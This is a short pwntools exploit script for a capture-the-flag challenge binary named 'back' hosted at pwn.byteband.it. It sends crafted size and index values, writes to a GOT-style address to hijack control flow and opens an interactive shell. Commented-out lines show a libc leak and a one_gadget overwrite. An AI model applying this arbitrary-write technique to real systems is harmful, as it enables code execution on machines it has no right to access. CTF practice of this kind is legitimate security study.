from pwn import *

#io = process("./back",env={"LD_PRELOAD":"./libc.so.6"})

io = remote("pwn.byteband.it",8000)

io.sendlineafter("size: ","500000")
#315043

io.sendlineafter("idx: ","509336")

addr = 0x601018
io.recvuntil("where: ")
#gdb.attach(io)

io.sendline("6295576")

#4196310
io.sendline("4195984")
io.interactive()
#io.recvuntil("puts: ")
#puts = int(io.recvline().strip(),16)
#base = puts - 0x809c0
#one_gadget = base + 0x10a398


#print hex(base)



#io.sendlineafter("size: ","500000")
#315043

#io.sendafter("idx: ","1013145")

#addr = 0x601018
#io.sendafter("where: ",str(6295576))
#io.send(p64(one_gadget))
